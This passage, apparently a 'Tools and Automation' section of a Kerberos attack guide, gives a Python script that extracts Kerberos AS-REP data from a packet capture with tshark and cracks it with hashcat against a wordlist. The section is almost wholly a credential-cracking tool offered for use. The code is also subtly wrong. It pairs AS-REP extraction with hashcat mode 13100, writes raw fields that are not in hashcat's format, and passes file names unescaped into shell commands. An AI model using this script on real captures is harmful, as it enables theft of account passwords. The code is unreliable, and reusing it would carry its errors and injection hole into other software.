## Part 5: Tools and Automation

### All-in-One Extraction and Cracking Script

```python
#!/usr/bin/env python3
"""
Kerberos PCAP to Hashcat Pipeline
"""

import subprocess
import sys
from pathlib import Path

def extract_kerberos_hashes(pcap_file, output_hash_file):
    """Extract Kerberos hashes from PCAP using tshark"""
    
    # Extract AS-REP
    cmd = f"tshark -r {pcap_file} -Y 'kerberos.msg_type == 11' -T fields -e kerberos.EncryptedData"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    with open(output_hash_file, 'w') as f:
        f.write(result.stdout)
    
    print(f"[+] Extracted hashes to {output_hash_file}")
    return output_hash_file

def crack_hashes(hash_file, wordlist, hash_mode=13100):
    """Crack extracted Kerberos hashes with hashcat"""
    
    cmd = f"hashcat -m {hash_mode} -a 0 -O -w 3 {hash_file} {wordlist}"
    print(f"[*] Running: {cmd}")
    
    result = subprocess.run(cmd, shell=True)
    
    return result.returncode == 0

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 kerberos_crack.py <pcap_file> <wordlist>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    wordlist = sys.argv[2]
    
    print(f"[*] Processing PCAP: {pcap_file}")
    
    # Extract hashes
    hash_file = "extracted_hashes.txt"
    extract_kerberos_hashes(pcap_file, hash_file)
    
    # Crack hashes
    print(f"[*] Cracking hashes with {wordlist}")
    success = crack_hashes(hash_file, wordlist)
    
    if success:
        print("[+] Cracking completed!")
    else:
        print("[-] Cracking failed or no hashes cracked")

if __name__ == "__main__":
    main()
```

Usage:
```bash
python3 kerberos_crack.py kerberos.pcap wordlist.txt
```

